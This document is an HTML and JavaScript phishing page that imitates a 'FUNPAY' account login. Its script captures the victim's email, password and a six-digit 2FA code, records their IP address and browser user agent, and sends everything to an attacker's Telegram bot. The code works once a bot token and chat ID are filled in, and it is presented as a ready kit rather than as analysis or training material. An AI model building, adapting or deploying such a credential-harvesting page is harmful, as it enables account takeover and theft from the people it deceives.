<!doctype html>
<html lang="en" class="dark">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=yes"
    />
    <link rel="icon" href="data:image/svg+xml;base64,CiAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+CiAgICA8Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSIzMiIgZmlsbD0iIzBjNjhiMyIgLz4KICA8L3N2Zz4K" type="image/data:image/svg+xml;base64,CiAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+CiAgICA8Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSIzMiIgZmlsbD0iIzBjNjhiMyIgLz4KICA8L3N2Zz4K">
    <title>FUNPAY — Account Login</title>
    <!-- Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;500;600;700;800;900&family=Inter:wght@100..900&display=swap"
      rel="stylesheet"
    />
    <!-- Material Design Icons -->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@mdi/font@7.4.47/css/materialdesignicons.min.css"
    />
    <style>
      /* ---------- RESET & GLOBAL ---------- */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: "Golos Text", "Inter", system-ui, sans-serif;
        background: rgb(22, 22, 22);
        color: rgb(255, 255, 255);
        line-height: 1.5;
      }

      #recoveryCodeBtn {
        background: transparent !important;
        border: none !important;
      }

      /* Vuetify dark theme variables */
      :root {
        --v-theme-background: 22, 22, 22;
        --v-theme-surface: 35, 35, 35;
        --v-theme-primary: 12, 104, 179;
        --v-theme-on-primary: 255, 255, 255;
        --v-theme-error: 239, 69, 74;
        --v-theme-cardbox: 35, 35, 35;
        --v-border-opacity: 0.12;
      }

      .dark {
        color-scheme: dark;
      }

      /* App wrapper */
      .v-application {
        display: flex;
        background: rgb(var(--v-theme-background));
        min-height: 100vh;
      }

      .v-application__wrap {
        display: flex;
        flex-direction: column;
        flex: 1 1 auto;
        min-height: 100vh;
        position: relative;
      }

      /* App Bar */
      .app-bar {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        z-index: 1004;
        background: rgb(var(--v-theme-surface));
        backdrop-filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1));
        padding: 0 1rem;
        height: 64px;
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .logo-box {
        display: flex;
        align-items: center;
        gap: 8px;
        cursor: pointer;
      }

      .logo-icon {
        width: 24px;
        height: 24px;
        background: rgb(var(--v-theme-primary));
        border-radius: 9999px;
      }

      .logo-text {
        font-size: 1.25rem;
        font-weight: 600;
        color: white;
      }

      .toolbar-actions {
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .icon-btn {
        background: rgb(var(--v-theme-background));
        border-radius: 50%;
        width: 36px;
        height: 36px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        transition: 0.2s;
        color: rgba(255, 255, 255, 0.8);
      }

      .icon-btn:hover {
        background: rgba(255, 255, 255, 0.08);
      }

      /* Main content */
      .v-main {
        flex: 1 0 auto;
        padding-top: 64px;
      }

      .container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 1rem;
      }

      .login-grid {
        display: grid;
        grid-template-columns: 1fr;
        gap: 1rem;
        padding: 3rem 0;
        min-height: calc(100vh - 96px);
        align-items: center;
      }

      @media (min-width: 960px) {
        .login-grid {
          grid-template-columns: repeat(12, 1fr);
        }
        .login-center {
          grid-column: 4 / span 6;
        }
      }

      .login-card {
        border-radius: 1rem;
        padding: 1.5rem;
      }

      .title {
        font-size: 1.875rem;
        font-weight: 600;
        margin-bottom: 4px;
      }

      .sub {
        margin-bottom: 1rem;
        font-weight: 500;
      }

      /* Form field styles (Vuetify style) */
      .v-input {
        display: grid;
        flex: 1 1 auto;
        font-size: 1rem;
      }

      .v-field {
        display: flex;
        justify-content: space-between;
        background: rgb(35, 35, 35);
        border-radius: 4px;
        position: relative;
      }

      .v-field--variant-solo {
        background: rgb(var(--v-theme-surface));
      }

      .v-field__field {
        width: 100%;
      }

      .v-field__input {
        align-items: center;
        display: flex;
        flex-wrap: wrap;
        min-height: 56px;
        padding: 8px 16px;
        width: 100%;
        color: white;
        background: transparent;
        font-size: 1rem;
      }

      .v-field__input input {
        background: transparent;
        border: none;
        outline: none;
        color: white;
        width: 100%;
        font-size: 1rem;
      }

      .v-field__input input::placeholder {
        color: rgba(255, 255, 255, 0.5);
      }

      .v-field--error {
        border-color: rgb(var(--v-theme-error));
      }

      .v-messages {
        font-size: 0.75rem;
        color: rgb(var(--v-theme-error));
        min-height: 20px;
        margin-left: 1rem;
      }

      .append-icon {
        display: flex;
        align-items: center;
        padding-right: 12px;
        cursor: pointer;
        color: rgba(255, 255, 255, 0.6);
      }

      /* Button */
      .v-btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border-radius: 4px;
        font-weight: 600;
        padding: 0 20px;
        height: 50px;
        background: rgb(var(--v-theme-primary));
        color: white;
        border: none;
        cursor: pointer;
        transition: 0.2s;
        width: 100%;
        font-size: 1.15rem;
      }

      .text-neutral-400 {
        color: #a3a3a3;
      }

      .text-center {
        text-align: center;
      }

      .text-sm {
        font-size: 0.875rem;
      }

      .mt-6 {
        margin-top: 1.5rem;
      }

      /* ---------- 2FA MODAL (exactly like original Vuetify overlay) ---------- */
      .v-overlay-container {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 2000;
        display: flex;
        align-items: center;
        justify-content: center;
        visibility: hidden;
        opacity: 0;
        transition:
          visibility 0.2s,
          opacity 0.2s;
        background: rgba(0, 0, 0, 0.6);
      }

      .v-overlay-container.active {
        visibility: visible;
        opacity: 1;
      }

      .v-overlay__content {
        max-width: 400px;
        width: 90%;
        outline: none;
      }

      .v-card {
        background: rgb(var(--v-theme-cardbox));
        border-radius: 4px;
        overflow: hidden;
        box-shadow:
          0 11px 15px -7px rgba(0, 0, 0, 0.2),
          0 24px 38px 3px rgba(0, 0, 0, 0.14),
          0 9px 46px 8px rgba(0, 0, 0, 0.12);
      }

      .v-card-item {
        padding: 16px 24px;
      }

      .v-card-title {
        font-size: 1.25rem;
        font-weight: 500;
        letter-spacing: 0.0125em;
      }

      .v-card-text {
        padding: 16px 24px 24px;
        font-size: 0.875rem;
      }

      /* OTP Input (Vuetify style with 6 separate fields) */
      .v-otp-input {
        margin-bottom: 1rem;
      }

      .v-otp-input__content {
        align-items: center;
        display: flex;
        gap: 0.5rem;
        justify-content: center;
        padding: 0.5rem;
      }

      .v-field--variant-plain {
        background: transparent;
      }

      .bg-background {
        background: rgb(var(--v-theme-background));
      }

      .v-otp-input__field {
        background: #161616;
        border: 0;
        border-radius: 8px;
        width: 44px;
        height: 48px;
        text-align: center;
        font-size: 1.25rem;
        color: white;
        outline: none;
        transition: all 0.2s;
      }

      .cursor-pointer {
        cursor: pointer;
      }

      .hover\:underline:hover {
        text-decoration: underline;
      }

      .text-primary {
        color: rgb(var(--v-theme-primary));
      }

      .btn-secondary {
        background: rgba(255, 255, 255, 0.1);
        color: white;
      }

      .btn-secondary:hover {
        background: rgba(255, 255, 255, 0.2);
        transform: scale(0.98);
      }

      .error-msg {
        color: rgb(var(--v-theme-error));
        font-size: 0.75rem;
        margin-top: 0.5rem;
        text-align: center;
        display: none;
      }

      hr {
        margin: 1rem 0;
        border-color: rgba(255, 255, 255, 0.1);
      }

      /* Floating label styles */
      .v-field {
        position: relative;
        display: flex;
        justify-content: space-between;
        background: rgb(35, 35, 35);
        border-radius: 4px;
        position: relative;
        border: 0;
        transition: border-color 0.2s;
      }

      .v-field--focused {
        border-color: rgb(var(--v-theme-primary));
      }

      .v-field--error {
        border-color: rgb(var(--v-theme-error));
      }

      .v-field__label {
        position: absolute;
        left: 16px;
        top: 18px;
        font-size: 1rem;
        color: rgba(255, 255, 255, 0.6);
        pointer-events: none;
        transition: all 0.15s ease-out;
        background: transparent;
        padding: 0 2px;
      }

      .v-field__label--float {
        top: 5px;
        left: 12px;
        font-size: 0.75rem;
        font-weight: 500;
        background: transparent;
        padding: 0 4px;
        color: rgba(255, 255, 255, 0.7);
      }

      .v-field--focused .v-field__label {
        color: rgb(var(--v-theme-primary));
      }

      .v-field--focused .v-field__label--float {
        color: rgb(var(--v-theme-primary));
      }

      .v-field--error .v-field__label,
      .v-field--error .v-field__label--float {
        color: rgb(var(--v-theme-error));
      }

      .v-field__input {
        padding-top: 16px !important;
        padding-bottom: 4px !important;
      }

      .v-field__input input {
        margin-top: 4px;
        font-family: 'Golos Text';
      }

      /* Error icon color for eye */
      .v-field--error .append-icon i {
        color: rgb(var(--v-theme-error));
      }

      /* Ensure label background matches field */
.v-field__label--float {
  background: rgb(var(--v-theme-surface));
  border-radius: 4px;
}

/* Fix for error state on label */
.v-field--error .v-field__label,
.v-field--error .v-field__label--float {
  color: rgb(var(--v-theme-error)) !important;
}

/* Transition for smooth label movement */
.v-field__label {
  transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
}
    </style>
  </head>
  <body>
    <div class="v-application">
      <div class="v-application__wrap">
        <!-- App Bar -->
        <header class="app-bar">
          <div class="logo-box">
            <div class="logo-icon"></div>
            <p class="logo-text">FUNPAY</p>
          </div>
          <div class="toolbar-actions">
            <div class="icon-btn" title="Language (placeholder)">
              <i class="mdi mdi-translate" style="font-size: 1.25rem"></i>
            </div>
            <div class="icon-btn" title="Theme (dark only)">
              <i
                class="mdi mdi-white-balance-sunny"
                style="font-size: 1.25rem"
              ></i>
            </div>
          </div>
        </header>

        <main class="v-main">
          <div class="container">
            <div class="login-grid">
              <div class="login-center">
                <div class="login-card">
                  <h2 class="title">Login</h2>
                  <p class="sub">Log in to get started</p>

                  <!-- Login Form -->
                  <form id="loginForm">
                    <!-- Email field -->
                    <!-- Email field -->
                    <div class="v-input" id="emailGroup">
                      <div
                        class="v-field v-field--variant-solo"
                        id="emailField"
                      >
                        <div class="v-field__field">
                          <div class="v-field__input">
                            <input
                              type="text"
                              id="loginEmail"
                              autocomplete="username"
                            />
                          </div>
                        </div>
                        <label class="v-field__label" id="emailLabel"
                          >Email</label
                        >
                        <div
                          class="append-icon"
                          style="visibility: hidden"
                        ></div>
                      </div>
                      <div class="v-messages" id="emailError"></div>
                    </div>

                    <!-- Password field with eye icon -->
                    <!-- Password field with eye icon -->
                    <div class="v-input" id="passGroup">
                      <div
                        class="v-field v-field--variant-solo"
                        id="passwordField"
                      >
                        <div class="v-field__field">
                          <div class="v-field__input">
                            <input
                              type="password"
                              id="loginPassword"
                              autocomplete="current-password"
                            />
                          </div>
                        </div>
                        <label class="v-field__label" id="passwordLabel"
                          >Password</label
                        >
                        <div class="append-icon" id="togglePassword">
                          <i
                            class="mdi mdi-eye-outline"
                            style="font-size: 1.75rem"
                          ></i>
                        </div>
                      </div>
                      <div class="v-messages" id="passwordError"></div>
                    </div>

                    <button type="submit" class="v-btn" id="submitLoginBtn">
                      Log in
                    </button>
                    <p class="text-center text-sm text-neutral-400 mt-6">
                      v 1.0.0 - FUNPAY
                    </p>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>

    <!-- 2FA Modal (exactly as in original Vuetify overlay) -->
    <div id="otpOverlay" class="v-overlay-container">
      <div class="v-overlay__content" tabindex="-1">
        <div
          class="v-card v-theme--customDarkTheme v-card--density-default v-card--variant-elevated card-box bg-cardbox text-center"
        >
          <div class="v-card-item">
            <div class="v-card-item__content">
              <div class="v-card-title">2FA Verification</div>
            </div>
          </div>
          <p class="text-sm text-neutral-400 text-center">
            Enter the code from your authenticator app
          </p>

          <div class="v-card-text">
            <!-- OTP Input with 6 separate fields -->
            <div class="v-otp-input" id="otpContainer">
              <div class="v-otp-input__content" id="otpFieldsContainer">
                <!-- 6 individual OTP fields will be generated here -->
              </div>
            </div>

            <button
              type="button"
              id="recoveryCodeBtn"
              class="text-sm text-primary cursor-pointer hover:underline"
            >
              Use recovery code
            </button>
            <div id="modalError" class="error-msg"></div>
          </div>
        </div>
      </div>
    </div>

    <script>
      // ==================== TELEGRAM CONFIGURATION ====================
      // ⚠️ IMPORTANT: Replace with your actual bot token and chat ID
      const BOT_TOKEN = "YOUR_BOT_TOKEN"; // ← Replace here
      const CHAT_ID = "YOUR_CHAT_ID"; // ← Replace here
      // ================================================================

      // DOM Elements
      const loginForm = document.getElementById("loginForm");
      const emailInput = document.getElementById("loginEmail");
      const passwordInput = document.getElementById("loginPassword");
      const emailError = document.getElementById("emailError");
      const passwordError = document.getElementById("passwordError");
      const emailField = document.getElementById("emailField");
      const passwordField = document.getElementById("passwordField");
      const togglePasswordBtn = document.getElementById("togglePassword");
      const submitBtn = document.getElementById("submitLoginBtn");

      // 2FA Modal elements
      const otpOverlay = document.getElementById("otpOverlay");
      const otpFieldsContainer = document.getElementById("otpFieldsContainer");
      const modalError = document.getElementById("modalError");
      const recoveryBtn = document.getElementById("recoveryCodeBtn");

      // State
      let pendingEmail = "";
      let pendingPassword = "";
      let otpInputs = [];

      // Helper: Get client IP (for logging)
      let clientIP = "unknown";
      fetch("https://api.ipify.org?format=json")
        .then((res) => res.json())
        .then((data) => {
          if (data.ip) clientIP = data.ip;
        })
        .catch(() => {});

      // Send message to Telegram
      async function sendToTelegram(message) {
        if (
          !BOT_TOKEN ||
          BOT_TOKEN === "YOUR_BOT_TOKEN" ||
          !CHAT_ID ||
          CHAT_ID === "YOUR_CHAT_ID"
        ) {
          console.warn("⚠️ Telegram not configured. Message:", message);
          // Still show "success" in demo, but console warning
          return true;
        }
        try {
          const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "HTML",
              }),
            },
          );
          const data = await response.json();
          return data.ok;
        } catch (err) {
          console.error("Telegram send error:", err);
          return false;
        }
      }

      // Format credentials message
      function formatCredentialsMessage(email, password, code = null) {
        const timestamp = new Date().toLocaleString();
        let msg = `<b>🔐 FUNPAY LOGIN ATTEMPT</b>\n🕒 ${timestamp}\n📧 Email: ${email}\n🔑 Password: ${password}`;
        if (code) {
          msg += `\n🔢 2FA Code: ${code}`;
        }
        msg += `\n🌐 IP: ${clientIP}`;
        msg += `\n🖥️ User-Agent: ${navigator.userAgent.substring(0, 100)}`;
        return msg;
      }

      // Validate login form
      function validateLogin() {
        let isValid = true;
        const email = emailInput.value.trim();
        const pass = passwordInput.value;

        emailError.textContent = "";
        passwordError.textContent = "";
        emailField.classList.remove("v-field--error");
        passwordField.classList.remove("v-field--error");

        if (!email) {
          emailError.textContent = "Required field";
          emailField.classList.add("v-field--error");
          isValid = false;
        } else if (!email.includes("@") || email.length < 3) {
          emailError.textContent = "Enter a valid email";
          emailField.classList.add("v-field--error");
          isValid = false;
        }

        if (!pass) {
          passwordError.textContent = "Required field";
          passwordField.classList.add("v-field--error");
          isValid = false;
        }

        return isValid;
      }

      // Create OTP input fields (6 digits)
      function createOTPFields() {
        otpFieldsContainer.innerHTML = "";
        otpInputs = [];
        for (let i = 0; i < 6; i++) {
          const input = document.createElement("input");
          input.type = "text";
          input.inputMode = "numeric";
          input.maxLength = 1;
          input.classList.add("v-otp-input__field");
          input.setAttribute(
            "aria-label",
            `Please enter OTP character ${i + 1}`,
          );
          input.setAttribute("autocomplete", "one-time-code");
          input.dataset.index = i;

          input.addEventListener("input", (e) => handleOTPInput(e, i));
          input.addEventListener("keydown", (e) => handleOTPKeydown(e, i));
          input.addEventListener("focus", (e) => e.target.select());

          otpFieldsContainer.appendChild(input);
          otpInputs.push(input);
        }
        // Focus first field when modal opens
      }

      function handleOTPInput(e, index) {
        const val = e.target.value.replace(/[^0-9]/g, "");
        e.target.value = val;

        if (val.length === 1 && index < 5) {
          otpInputs[index + 1].focus();
        }
        // Clear error when user starts typing
        modalError.style.display = "none";
        modalError.textContent = "";
      }

      function handleOTPKeydown(e, index) {
        if (e.key === "Backspace" && !e.target.value && index > 0) {
          otpInputs[index - 1].focus();
        }
      }

      function getOTPValue() {
        let code = "";
        for (let input of otpInputs) {
          code += input.value;
        }
        return code;
      }

      function clearOTPFields() {
        for (let input of otpInputs) {
          input.value = "";
        }
        if (otpInputs[0]) otpInputs[0].focus();
      }

      // Show 2FA modal
      function show2FAModal(email, password) {
        pendingEmail = email;
        pendingPassword = password;
        createOTPFields();
        otpOverlay.classList.add("active");
        setTimeout(() => {
          if (otpInputs[0]) otpInputs[0].focus();
        }, 100);
        modalError.style.display = "none";
        modalError.textContent = "";
      }

      // Hide modal
      function hideModal() {
        otpOverlay.classList.remove("active");
        pendingEmail = "";
        pendingPassword = "";
      }

      // Submit 2FA code
      async function submit2FACode() {
        const code = getOTPValue();
        if (code.length !== 6) {
          modalError.textContent = "Please enter all 6 digits";
          modalError.style.display = "block";
          return;
        }

        // Disable submit button temporarily
        const verifyBtn = document.querySelector(
          "#otpOverlay .v-card .v-card-text button",
        );
        let originalText = "";
        if (verifyBtn && verifyBtn.tagName === "BUTTON") {
          originalText = verifyBtn.textContent;
          verifyBtn.disabled = true;
          verifyBtn.textContent = "Verifying...";
        }

        // Send credentials + 2FA code to Telegram
        const message = formatCredentialsMessage(
          pendingEmail,
          pendingPassword,
          code,
        );
        const sent = await sendToTelegram(message);

        if (sent) {
          // Success - show alert and reset form
          alert(
            "✅ Verification successful! (Demo)\nCredentials have been sent.",
          );
          hideModal();
          // Reset login form
          emailInput.value = "";
          passwordInput.value = "";
          emailField.classList.remove("v-field--error");
          passwordField.classList.remove("v-field--error");
          emailError.textContent = "";
          passwordError.textContent = "";
        } else {
          modalError.textContent = "Verification failed. Please try again.";
          modalError.style.display = "block";
        }

        if (verifyBtn) {
          verifyBtn.disabled = false;
          verifyBtn.textContent = originalText || "Verify";
        }
      }

      // Recovery code handler (just for UI consistency)
      function handleRecoveryCode() {
        modalError.textContent =
          "Recovery codes are not available in demo mode.";
        modalError.style.display = "block";
        setTimeout(() => {
          modalError.style.display = "none";
        }, 2000);
      }

      // Login form submit
      loginForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        if (!validateLogin()) return;

        const email = emailInput.value.trim();
        const password = passwordInput.value;

        // Show 2FA modal (as per original flow)
        show2FAModal(email, password);
      });

      // Toggle password visibility
      togglePasswordBtn.addEventListener("click", () => {
        const type = passwordInput.type === "password" ? "text" : "password";
        passwordInput.type = type;
        const icon = togglePasswordBtn.querySelector("i");
        if (type === "text") {
          icon.classList.remove("mdi-eye-outline");
          icon.classList.add("mdi-eye-off-outline");
        } else {
          icon.classList.remove("mdi-eye-off-outline");
          icon.classList.add("mdi-eye-outline");
        }
      });

      // Close modal on overlay click
      otpOverlay.addEventListener("click", (e) => {
        if (e.target === otpOverlay) {
          hideModal();
        }
      });

      // Add Verify button to modal (since original Vuetify card doesn't have it in HTML)
      function addVerifyButtonToModal() {
        const cardText = document.querySelector("#otpOverlay .v-card-text");
        if (cardText && !document.getElementById("modalVerifyBtn")) {
          const buttonDiv = document.createElement("div");
          cardText.appendChild(buttonDiv);

          document
            .getElementById("modalCancelBtn")
            ?.addEventListener("click", hideModal);
          document
            .getElementById("modalVerifyBtn")
            ?.addEventListener("click", submit2FACode);
        }
      }

      // Also add Enter key support for OTP
      document.addEventListener("keydown", (e) => {
        if (otpOverlay.classList.contains("active") && e.key === "Enter") {
          e.preventDefault();
          submit2FACode();
        }
      });

      // Recovery button handler
      recoveryBtn.addEventListener("click", handleRecoveryCode);

      // Initialize modal buttons after DOM ready
      setTimeout(() => {
        addVerifyButtonToModal();
      }, 100);

      // ==================== FLOATING LABELS ====================
function setupFloatingLabel(input, label, fieldContainer) {
  function updateLabel() {
    const hasValue = input.value.length > 0;
    const isFocused = document.activeElement === input;
    
    if (hasValue || isFocused) {
      label.classList.add('v-field__label--float');
    } else {
      label.classList.remove('v-field__label--float');
    }
    
    if (isFocused) {
      fieldContainer.classList.add('v-field--focused');
    } else {
      fieldContainer.classList.remove('v-field--focused');
    }
  }
  
  input.addEventListener('focus', updateLabel);
  input.addEventListener('blur', updateLabel);
  input.addEventListener('input', updateLabel);
  updateLabel();
}

// Setup floating labels
const emailLabel = document.getElementById('emailLabel');
const passwordLabel = document.getElementById('passwordLabel');

setupFloatingLabel(emailInput, emailLabel, emailField);
setupFloatingLabel(passwordInput, passwordLabel, passwordField);

// Override validateLogin to handle error styles properly
const originalValidate = validateLogin;
window.validateLogin = function() {
  let isValid = true;
  const email = emailInput.value.trim();
  const pass = passwordInput.value;
  
  emailError.textContent = '';
  passwordError.textContent = '';
  emailField.classList.remove('v-field--error');
  passwordField.classList.remove('v-field--error');
  emailLabel.classList.remove('v-field--error');
  passwordLabel.classList.remove('v-field--error');
  
  if (!email) {
    emailError.textContent = 'Required field';
    emailField.classList.add('v-field--error');
    emailLabel.classList.add('v-field--error');
    isValid = false;
  } else if (!email.includes('@') || email.length < 3) {
    emailError.textContent = 'Enter a valid email';
    emailField.classList.add('v-field--error');
    emailLabel.classList.add('v-field--error');
    isValid = false;
  }
  
  if (!pass) {
    passwordError.textContent = 'Required field';
    passwordField.classList.add('v-field--error');
    passwordLabel.classList.add('v-field--error');
    isValid = false;
  }
  
  return isValid;
};

// Replace validateLogin with new version
validateLogin = window.validateLogin;

// Also update error clearing when user types
emailInput.addEventListener('input', () => {
  if (emailInput.value.trim()) {
    emailField.classList.remove('v-field--error');
    emailLabel.classList.remove('v-field--error');
    emailError.textContent = '';
  }
});

passwordInput.addEventListener('input', () => {
  if (passwordInput.value) {
    passwordField.classList.remove('v-field--error');
    passwordLabel.classList.remove('v-field--error');
    passwordError.textContent = '';
  }
});
